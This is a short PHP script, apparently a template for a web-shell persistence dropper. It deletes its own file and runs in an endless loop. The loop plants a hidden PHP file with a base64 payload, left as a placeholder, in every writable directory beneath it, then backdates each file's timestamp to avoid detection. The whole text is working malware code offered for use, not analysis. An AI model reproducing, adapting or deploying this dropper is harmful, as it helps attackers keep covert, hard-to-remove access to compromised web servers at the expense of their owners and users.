<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
function createSFile($dir) {
    if (!is_dir($dir) || !is_readable($dir)) { return; }
    $dirs = array_slice(@scandir($dir),2);
    if ($dir=='/'){ $dir=''; }
    foreach ($dirs as $directory) {
        $subdir = $dir . DIRECTORY_SEPARATOR . $directory;
        if (is_dir($subdir)) { createSFile($subdir); }
    }
    if (!is_writable($dir)){ return; }
    $file = $dir.DIRECTORY_SEPARATOR.'.HM_NAME_REPLACE.php';
    $data = "WAIT_FOR_REPLACE";
    file_put_contents($file, base64_decode($data));
    system('touch -m -d "2018-12-01 09:10:12" '.$file);
}
while (1){ createSFile(dirname(__FILE__)); usleep(5000); }
?>